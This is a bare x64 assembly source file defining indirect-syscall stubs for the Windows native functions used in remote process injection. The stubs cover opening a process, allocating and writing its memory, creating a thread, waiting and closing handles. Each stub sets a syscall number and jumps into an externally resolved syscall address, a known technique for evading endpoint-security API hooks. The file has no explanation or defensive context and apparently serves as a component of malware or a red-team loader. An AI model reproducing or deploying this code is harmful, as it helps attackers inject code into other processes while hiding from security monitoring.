.data
extern wNtOpenProcess:DWORD
extern wNtAllocateVirtualMemory:DWORD
extern wNtWriteVirtualMemory:DWORD
extern wNtCreateThreadEx:DWORD
extern wNtWaitForSingleObject:DWORD
extern wNtClose:DWORD

extern sysAddrNtOpenProcess:QWORD
extern sysAddrNtAllocateVirtualMemory:QWORD
extern sysAddrNtWriteVirtualMemory:QWORD
extern sysAddrNtCreateThreadEx:QWORD
extern sysAddrNtWaitForSingleObject:QWORD
extern sysAddrNtClose:QWORD

.code
NtOpenProcess proc
	mov r10, rcx
	mov eax, wNtOpenProcess
	jmp sysAddrNtOpenProcess
NtOpenProcess endp

NtAllocateVirtualMemory proc
	mov r10, rcx
	mov eax, wNtAllocateVirtualMemory
	jmp sysAddrNtAllocateVirtualMemory
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc
	mov r10, rcx
	mov eax, wNtWriteVirtualMemory
	jmp sysAddrNtWriteVirtualMemory
NtWriteVirtualMemory endp

NtCreateThreadEx proc
	mov r10, rcx
	mov eax, wNtCreateThreadEx
	jmp sysAddrNtCreateThreadEx
NtCreateThreadEx endp

NtWaitForSingleObject proc
	mov r10, rcx
	mov eax, wNtWaitForSingleObject
	jmp sysAddrNtWaitForSingleObject
NtWaitForSingleObject endp

NtClose proc
	mov r10, rcx
	mov eax, wNtClose
	jmp sysAddrNtClose
NtClose endp
end